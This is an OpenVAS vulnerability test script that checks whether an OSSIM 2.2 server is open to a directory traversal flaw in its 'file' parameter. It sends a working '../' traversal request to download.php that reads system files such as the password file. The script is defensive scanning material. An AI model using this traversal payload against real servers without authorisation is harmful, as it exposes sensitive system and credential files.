###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ossim_38780.nasl 11657 2018-09-27 13:32:51Z cfischer $
#
# OSSIM 'file' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:alienvault:open_source_security_information_management";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100542");
  script_version("$Revision: 11657 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-27 15:32:51 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2010-03-19 11:14:17 +0100 (Fri, 19 Mar 2010)");
  script_bugtraq_id(38780);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("OSSIM 'file' Parameter Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38780");
  script_xref(name:"URL", value:"http://www.alienvault.com/community.php?section=News");
  script_xref(name:"URL", value:"http://www.cybsec.com/vuln/cybsec_advisory_2010_0306_ossim2_2_arbitrary_file_download.pdf");
  script_xref(name:"URL", value:"http://ossim.net/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_ossim_web_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OSSIM/installed");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"The vendor has released an update to address this issue. Please see
  the references for more information.");
  script_tag(name:"summary", value:"OSSIM is prone to a directory-traversal vulnerability because it fails
  to sufficiently sanitize user-supplied input data.");

  script_tag(name:"impact", value:"Exploiting the issue may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"OSSIM 2.2 is affected. Other versions may also be vulnerable.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files("linux");

foreach pattern(keys(files)) {
  file = files[pattern];

  url = string(dir,"/repository/download.php?file=../../../../../../../../" + file + "&name=passwd.txt");

  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!buf)continue;

  if(egrep(pattern:pattern, string:buf, icase:TRUE)) {
    report = report_vuln_url(port:port, url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(0);

